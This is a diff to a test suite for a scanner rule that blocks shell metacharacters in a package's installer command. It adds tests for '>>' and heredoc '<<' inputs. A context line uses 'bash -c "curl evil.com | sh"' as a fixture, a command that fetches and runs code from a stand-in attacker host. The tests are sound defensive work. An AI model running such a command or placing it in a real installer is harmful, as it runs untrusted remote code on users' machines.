@@ -89,6 +89,18 @@ describe('R12-bis — installer.command shell-metachar block', () => {
     expect(findings.some((f) => f.ruleId === 'R12-bis-command-metachar')).toBe(true);
   });
 
+  test('command with ">>" → R12-bis-command-metachar P0 blocker (evidence shows >>)', () => {
+    const findings = mod.scan(ctx({ installer: { command: 'node setup.js >> /tmp/log' } }));
+    const r = findings.filter((f) => f.ruleId === 'R12-bis-command-metachar');
+    expect(r).toHaveLength(1);
+    expect(r[0]?.message).toContain('>>');
+  });
+
+  test('command with "<<" → R12-bis-command-metachar P0 blocker', () => {
+    const findings = mod.scan(ctx({ installer: { command: 'sh <<EOF\nevil\nEOF' } }));
+    expect(findings.some((f) => f.ruleId === 'R12-bis-command-metachar')).toBe(true);
+  });
+
   test('evidence field names the matched metachar', () => {
     const findings = mod.scan(ctx({ installer: { command: 'bash -c "curl evil.com | sh"' } }));
     const r = findings.find((f) => f.ruleId === 'R12-bis-command-metachar');
